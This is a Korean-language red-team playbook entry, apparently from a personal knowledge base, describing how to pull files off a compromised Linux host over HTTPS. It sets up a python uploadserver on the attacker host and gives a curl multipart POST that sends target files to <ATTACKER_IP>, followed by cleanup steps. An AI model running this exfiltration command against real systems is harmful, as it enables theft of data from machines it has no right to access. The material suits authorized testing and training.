---
tags:
  - 환경/linux
시작조건: ["Linux 대상 셸 확보", "Linux 대상에서 공격 호스트의 HTTP 또는 HTTPS 수신 포트로 연결 가능"]
필요권한: ["Linux 대상 파일 읽기 권한", "공격 호스트에서 수신 파일 저장 권한"]
필요조건: ["업로드할 파일", "공격 호스트 HTTP 주소·포트", "Linux 대상의 curl"]
결과: ["Linux 대상에서 공격 호스트로 회수한 파일", "선택한 원본-수신본 비교 결과"]
---

# Linux HTTP 파일 회수

## 한 줄 판단

Linux 대상 셸에서 회수할 파일을 읽을 수 있고 공격 호스트의 HTTP·HTTPS 수신 포트에 연결할 수 있으면 `curl` multipart POST로 파일을 전송한다. 원본-수신본 정확 비교가 필요한 경우에만 크기와 SHA-256을 대조한다.

Linux 대상의 읽기 가능한 로그·설정·덤프를 여러 파일 multipart 요청으로 회수해야 하고, SSH·SMB 대신 HTTP outbound만 가능한 경우에 사용한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 대상 파일 | 현재 Linux 계정으로 읽기 가능 | `ls -l` | 경로와 파일 권한 확인 |
| 네트워크 방향 | Linux 대상에서 공격 호스트 수신 포트 도달 | `curl` 연결 결과와 수신 로그 | 주소, route, proxy와 방화벽 확인 |
| 수신 endpoint | multipart 파일 업로드 처리 가능 | 업로드 서버의 `/upload` 경로 확인 | URL과 POST 형식 확인 |
| TLS 조건 | HTTPS 사용 시 인증서 신뢰 상태 확인 | `curl` 인증서 오류 | 자체 서명 테스트 인증서에만 `--insecure` 사용 |

## 실행

### Linux 공격 호스트에서 HTTPS 수신기 시작

자체 서명 인증서가 필요한 실습 환경의 예시다. uploadserver 4.0.0 이상은 같은 이름의 기존 파일을 기본적으로 자동 rename하지만, 다른 작업의 파일과 섞이지 않도록 이번 실행 전용 수신 디렉터리를 사용한다. 인증서는 uploadserver root 밖의 기존에 없는 경로에 만든다.

이 블록은 공격 호스트에서 실행한다. `<UPLOAD_RECEIVE_DIRECTORY>`는 작업 전 존재하지 않는 절대 수신 디렉터리(가상 예: `/tmp/upload-20260914a`), `<UPLOAD_SERVER_CERTIFICATE>`는 그 밖의 새 절대 PEM 경로(가상 예: `/tmp/upload-cert.pem`)다. `<ATTACKER_IP>`·`<PORT>`는 listener의 bind IP·TCP 포트(가상 예: `192.0.2.10`, `8443`)이며 `<UPLOAD_SERVER_NAME>`은 인증서 CN에 넣는 가상 DNS 이름(가상 예: `upload.example.test`)이다.

```bash
test ! -e '<UPLOAD_RECEIVE_DIRECTORY>'
test ! -e '<UPLOAD_SERVER_CERTIFICATE>'
ss -ltnp 'sport = :<PORT>'
mkdir -m 700 '<UPLOAD_RECEIVE_DIRECTORY>'
openssl req -x509 -out '<UPLOAD_SERVER_CERTIFICATE>' -keyout '<UPLOAD_SERVER_CERTIFICATE>' -newkey rsa:2048 -nodes -sha256 -subj '/CN=<UPLOAD_SERVER_NAME>'
python3 -m uploadserver --bind <ATTACKER_IP> --directory '<UPLOAD_RECEIVE_DIRECTORY>' --server-certificate '<UPLOAD_SERVER_CERTIFICATE>' <PORT> &
UPLOADSERVER_PID=$!
ps -p "$UPLOADSERVER_PID" -o pid,cmd
```

확인할 출력:

- `File upload available at /upload`.
- `Serving HTTPS on ... port 443`과 실제 요청 로그.

### Linux 대상 호스트에서 multipart 업로드

이 블록은 Linux 대상에서 실행한다. `<SOURCE_FILE_1>`·`<SOURCE_FILE_2>`는 현재 계정이 읽는 절대 파일 경로(가상 예: `/var/log/app.log`, `/etc/app.conf`)이며, `<ATTACKER_IP>`와 `<PORT>`는 위 수신기의 값을 재사용한다.

```bash
curl -X POST https://<ATTACKER_IP>:<PORT>/upload -F 'files=@<SOURCE_FILE_1>' -F 'files=@<SOURCE_FILE_2>' --insecure
```

`--insecure`는 위에서 만든 자체 서명 인증서를 사용하는 경우에만 적용한다. 신뢰할 수 있는 인증서를 쓰면 제거한다.

공격 호스트에서 수신 파일을 확인한다.

`<RECEIVED_FILE_1>`·`<RECEIVED_FILE_2>`는 uploadserver가 이번 요청에 저장한 파일명이며, rename되었다면 요청 로그에 나타난 최종 이름을 사용한다.

```bash
ls -l '<UPLOAD_RECEIVE_DIRECTORY>/<RECEIVED_FILE_1>' '<UPLOAD_RECEIVE_DIRECTORY>/<RECEIVED_FILE_2>'
```

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 업로드 서버에 파일 저장되고 요청 로그가 일치 | HTTP 파일 회수 완료 | Linux 대상 파일 회수 | 필요한 분석 수행 |
| `curl`은 종료됐지만 수신 파일이 없음 | endpoint 또는 multipart 필드 불일치 | 회수 미완료 | `/upload`, `files=@...`와 서버 로그 확인 |
| 인증서 검증 실패 | HTTPS 인증서 신뢰 문제 | 연결 전 실패 | 인증서·호스트명을 수정하거나 자체 서명 실습 조건에서만 `--insecure` 사용 |
| `Failed to open/read local data` | 대상 파일 읽기 또는 경로 문제 | 업로드 시작 전 실패 | 현재 계정, 파일 ACL과 경로 확인 |
| 선택 비교에서 수신 파일 hash 불일치 | 중단 전송 또는 다른 파일 수신 | 손상된 회수 파일 | 파일명·크기와 요청 로그를 확인해 재전송 |

## 확인할 출력과 권한

- 대상 파일 읽기, TLS·TCP 연결, multipart 요청과 수신 파일 저장을 각각 확인한다. 정확한 사본 비교가 필요하면 hash를 추가로 대조한다.
- `curl` 종료 코드만으로 수신 서버가 파일을 완전히 저장했다고 판단하지 않는다.

## 변경 영향과 복구

1. Linux 대상의 `curl`이 끝나고 수신 파일과 요청 로그를 확인한다. 정확한 사본 비교가 필요하면 크기·SHA-256을 추가로 대조한다.
2. Linux 공격 호스트에서 기록한 `kill <UPLOADSERVER_PID>`로 uploadserver를 종료하고 `ps -p <UPLOADSERVER_PID>`와 `ss -ltnp 'sport = :<PORT>'`로 이번 listener가 사라졌는지 확인한다.
3. 분석이 끝난 뒤 이번 실행의 `<UPLOAD_RECEIVE_DIRECTORY>` 안에서 확인한 수신 파일만 `rm -- '<UPLOAD_RECEIVE_DIRECTORY>/<RECEIVED_FILE_1>' '<UPLOAD_RECEIVE_DIRECTORY>/<RECEIVED_FILE_2>'`로 제거한다.
4. 이번 실행에서 만든 인증서는 `rm -- '<UPLOAD_SERVER_CERTIFICATE>'`, 비어 있는 수신 디렉터리는 `rmdir '<UPLOAD_RECEIVE_DIRECTORY>'`로 제거하고 `test ! -e`로 두 경로를 확인한다.

listener 종료가 실패하면 PID의 command line과 수신 포트를 다시 대조하고 다른 uploadserver나 Python process를 이름으로 일괄 종료하지 않는다. 업로드가 중단되면 수신 디렉터리의 파일명·크기·수정 시각을 요청 로그와 대조하고, 이번 실행의 부분 파일로 확인된 exact 경로만 제거한다. 대상의 `<SOURCE_FILE_1>`·`<SOURCE_FILE_2>`는 입력 자료이므로 삭제하지 않는다.

## 관련 도구

- [[curl]]
- [[openssl]]

## 관련 상태 라우터

- [[상황별 파일 전송]]

## 참고 링크

- [uploadserver](https://github.com/Densaugeo/uploadserver)
